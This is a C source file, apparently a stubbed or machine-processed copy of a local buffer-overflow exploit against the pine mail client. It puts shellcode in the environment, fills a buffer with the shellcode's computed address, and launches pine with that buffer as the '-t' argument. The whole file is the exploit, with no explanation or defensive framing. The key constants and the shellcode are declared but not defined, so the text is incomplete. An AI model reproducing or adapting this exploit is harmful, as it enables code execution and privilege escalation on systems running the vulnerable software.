
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int BASE ;
 int BUFF_SIZE ;
 int PATH ;
 int PATH_SIZE ;
 int SC_SIZE ;
 int execle (int ,char*,char*,char*,int *,char**) ;
 int exit (int) ;
 char* malloc (int) ;
 int printf (char*,...) ;
 char* shellcode ;

main() {

 char *env[2]={shellcode,((void*)0)};
 char *buf, *ptr;
 long sc_addr;
 int i, buffsize=BUFF_SIZE;

 if (!(buf=malloc(buffsize+1))) {
  printf("Can't allocate memory.\n");
  exit(-1);
 }

 sc_addr=BASE-4-SC_SIZE-PATH_SIZE;

 ptr=buf;
 for(i=0;i<buffsize;i+=4) {
  *((long *)ptr)=sc_addr;
  ptr+=4;
 }
 *ptr++=0;

 printf("shellcode is at: 0x%08x\n",sc_addr);

 execle(PATH,"pine","-t",buf,((void*)0),env);
}
